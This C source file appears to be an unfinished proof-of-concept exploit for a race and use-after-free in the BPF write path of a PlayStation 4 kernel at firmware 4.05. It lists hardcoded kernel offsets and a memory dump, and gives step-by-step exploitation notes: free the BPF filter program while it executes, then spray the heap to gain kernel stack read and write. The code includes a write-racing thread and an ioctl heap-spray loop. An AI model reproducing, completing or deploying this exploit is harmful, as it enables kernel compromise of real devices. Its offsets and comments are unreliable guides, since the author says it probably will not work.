/* bpfwrite race condition */
/* discovered by @qwertyoruiopz */
/* some bullshit from golden */
 
/*
https://gist.github.com/msantos/939154/eaeba01ba40cb137322ba1ea6d49a1b15580fdab
 
https://github.com/freebsd/freebsd/blob/master/sys/net/bpf.c
https://github.com/freebsd/freebsd/blob/master/sys/net/bpf_filter.c
*/
 
/*
4.05 offsets
 
bpf_cdevsw 0x186F640
bpf_drvinit 0x317140
 
bpfopen 0x3171B0
bpf_dtor 0x318D80
bpfwrite 0x3175D0
bpfread 0x317290
bpf_filter 0x224580
bpf_validate 0x224D60
 
devfs_set_cdevpriv 0x383F20
devfs_get_cdevpriv 0x383EE0
 
bpfioctl 0x317A40
- BIOCSETIF     0x8020426C (calls bpf_setif)
- BIOCSETF      0x80104267 (inlined)
- BIOCSETWF     0x8010427B (inlined)
 
1. call bpfioctl with BIOCSETWF and a valid program
2. write to the bpf device.
3. call bpfioctl with BIOCSETWF and a valid program. This will free the old program while it is executing.
4. allocate heap data with instructions to read/write in stack memory
5. ????
6. profit
 
once we can manipulate the data in the program, we can write an invalid program that bpf_validate would otherwise throw away.
case BPF_ST:
            mem[pc->k] = A;
            continue;
           
case BPF_LD|BPF_MEM:
            A = mem[pc->k];
            continue;
 
*/
 
/*
kernbase 0xFFFFFFFF8A63C000
 
bpf_cdevsw(0xFFFFFFFF8BEAB640):
09 20 12 17 00 00 00 80
50 62 DC 8A FF FF FF FF
B0 31 95 8A FF FF FF FF
00 00 00 00 00 00 00 00
C0 11 83 8A FF FF FF FF
90 32 95 8A FF FF FF FF
D0 35 95 8A FF FF FF FF
40 3A 95 8A FF FF FF FF
30 4B 95 8A FF FF FF FF
50 30 83 8A FF FF FF FF
 
0x8000000017122009
0xFFFFFFFF8ADC6250 (offset: 0x78A250)   "bpf"
0xFFFFFFFF8A9531B0 (offset: 0x3171B0)   bpfopen
0x0000000000000000                      d_fdopen
0xFFFFFFFF8A8311C0 (offset: 0x1F51C0)   d_close
0xFFFFFFFF8A953290 (offset: 0x317290)   bpfread
0xFFFFFFFF8A9535D0 (offset: 0x3175D0)   bpfwrite
0xFFFFFFFF8A953A40 (offset: 0x317A40)   bpfioctl
0xFFFFFFFF8A954B30 (offset: 0x318B30)   bpfpoll d_poll
0xFFFFFFFF8A833050 (offset: 0x1F7050)   d_mmap
 
*/
 
#define BIOCSETWF 0x8010427B
 
__attribute__((aligned (1))) struct bpf_insn {
    uint16_t code;
    uint8_t jt;
    uint8_t jf;
    uint32_t k;
};
// needs to by 8 bytes
 
struct bpf_program {
    int bf_len;
    struct bpf_insn *bf_insns; // needs to be at offset 0x8
};
 
int bpf_device() {
    int fd = -1;
    char dev[32];
   
    fd = open("/dev/bpf", O_RDWR, 00700);
    if (fd > -1) {
        return fd;
    }
   
    for(int i = 0; i < 255; i++) {
        snprintf(dev, sizeof(dev), "/dev/bpf%u", i);
 
        fd = open(dev, O_RDWR, 00700);
        if (fd > -1) {
            return fd;
        }
    }
 
    return -1;
}
 
int bpfgo = 0;
int bpfend = 0;
void *bpfwrite_thread(void *vfd) {
    // write and activate bpfwrite -> bpf_filter
    int fd =(int)vfd;
   
    while(!bpfend) {
        // wait until we should go
        while(!bpfgo && !bpfend) ;
       
        char pack[32];
        memset(pack, 0x41414141, 32);
       
        write(fd, pack, 32);
       
        bpfgo = 0;
    }
   
    return 0;
}
 
void bpfpoc() {
    int fd = bpf_device();
   
    // setup a valid program
    // this is unique since it has a specific size that will allocated in a specific zone
    // (making it easier to allocate an object overlapping this one, also gives more time for bpf_filter to execute)
    // I used bpfc to compile a simple program
    struct bpf_program fp;
    struct bpf_insn insns[] = {
        // there are 31 instructions here (31 * sizeof(struct bpf_insn)) = 248
        // size of kernel malloc would be
        { 0x0, 0, 0, 0x00000539 }, // ld #1337
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x0, 0, 0, 0x00000539 },
        { 0x6, 0, 0, 0x00000000 }, // ret #0
    };
   
    fp.bf_len = sizeof(insns) / sizeof(struct bpf_insn);
    fp.bf_insns = &insns[0];
   
    // set this program
    ioctl(fd, BIOCSETWF, &fp);
   
    // create thread that we can command to write to the bpf device
    ScePthread thread;
    scePthreadCreate(&thread, NULL, bpfwrite_thread, (void *)fd, "bpfpoc");
   
    // this poc gets turned into a much harder one since bpf code always halts in finite time, so we must race the bpf_filter function
    // hopefully we can race the bpfwrite function after we free the program, so it will use after free
    // we need to allocate a heap object that overlaps the memory that use to be at (struct bpf_insn)
    // (allocated by bpfioctl and freed by our second call to bpfioctl, but the pointer is still being used by bpf_filter)
    // create a malicious filter program and alter the overlapping heap object with this data
    // read/write stack values, and do turing complete programming in kernel mode
   
    // this probably will not work, and will not race correctly, you may need to multi thread
    // TODO: timing corrections
    while(1) {
        bpfgo = 1;
       
        // free the old program
        ioctl(fd, BIOCSETWF, &fp);
       
        // spray the heap
        // size = ((unsigned int)ioctl_num >> 16) & 0x1FFF;
        char object[248];
        memset(object, 0x41414141, 248);
        for(int i = 0; i < 512; i++) {
            ioctl(0xFFFFFFFF, 0x80F80000, object);
        }
       
        // now we may or may not have overlapped said bpf_insn allocation that bpf_filter is using
       
        // need a way to check if we are good
        break;
    }
   
   
    // end thread and clean up
    bpfend = 1;
    scePthreadJoin(thread, NULL);
   
    close(fd);
}
